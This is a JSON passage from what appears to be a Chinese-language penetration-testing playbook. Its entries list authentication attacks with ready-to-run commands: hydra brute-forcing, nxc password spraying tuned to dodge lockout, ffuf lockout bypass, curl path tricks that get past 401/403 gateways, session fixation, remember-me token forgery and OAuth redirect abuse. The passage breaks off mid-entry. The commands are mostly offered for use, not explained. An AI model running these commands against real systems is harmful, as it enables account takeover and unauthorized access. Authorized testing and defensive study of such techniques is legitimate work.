[{"id":"auth-default-creds","n":"默认口令核验","cat":"认证授权","phase":"exploit","d":"用产品默认账号字典验证管理面是否改密。","cmds":["nuclei -l alive.txt -tags default-login","hydra -L users.txt -P pass.txt <ip> http-post-form '/login:u=^USER^&p=^PASS^:F=invalid'"],"tools":["nuclei","hydra"],"tags":["brute"]},{"id":"auth-spray","n":"低速率口令喷洒","cat":"认证授权","phase":"exploit","d":"固定口令轮换用户名，规避锁定阈值。","cmds":["nxc smb <ip> -u users.txt -p 'Spring2024' --continue-on-success"],"tools":["nxc"],"tags":["spray"]},{"id":"auth-lock-bypass","n":"锁定策略绕过","cat":"认证授权","phase":"exploit","d":"用 X-Forwarded-For、大小写、尾随空格绕过计数。","cmds":["ffuf -u https://<host>/login -X POST -d 'u=admin%20&p=FUZZ' -w pass.txt"],"tools":["ffuf"],"tags":["bypass"]},{"id":"auth-basic-bypass","n":"Basic 认证绕过","cat":"认证授权","phase":"exploit","d":"路径变形、方法切换与空凭据绕过基础认证。","cmds":["curl -s https://<host>/admin/../admin/ -u :"],"tools":["curl"],"tags":["bypass"]},{"id":"auth-401-403-bypass","n":"401/403 访问绕过","cat":"认证授权","phase":"exploit","d":"用 .do 后缀、分号、大小写与 header 注入绕过网关鉴权。","cmds":["curl -s https://<host>/admin/list.do;.js","curl -s https://<host>/admin/%2e/users"],"tools":["curl"],"tags":["bypass"]},{"id":"auth-session-fixation","n":"会话固定","cat":"认证授权","phase":"exploit","d":"登录前注入已知 session 值，登录后复用他人会话。","cmds":["curl -s -b 'JSESSIONID=known' -c jar https://<host>/login -d 'u=a&p=b'"],"tools":["curl"],"tags":["session"]},{"id":"auth-session-predict","n":"会话可预测","cat":"认证授权","phase":"exploit","d":"采样会话值分析规律，预测有效会话。","cmds":["seq 1 30 | xargs -I{} curl -s -I https://<host>/ | grep -i set-cookie"],"tools":["curl"],"tags":["session"]},{"id":"auth-remember-me","n":"记住我令牌滥用","cat":"认证授权","phase":"exploit","d":"解析持久 cookie 结构，构造任意用户令牌。","cmds":["python3 -c \"import base64;print(base64.b64decode('<v>'))\""],"tools":["python"],"tags":["cookie"]},{"id":"auth-oauth-misconfig","n":"OAuth 流程配置缺陷","cat":"认证授权","phase":"exploit","d":"缺 state、隐式流、宽松 redirect_uri 导致账号接管。","cmds":["curl -s 'https://<idp>/authorize?response_type=token&redirect_uri=https://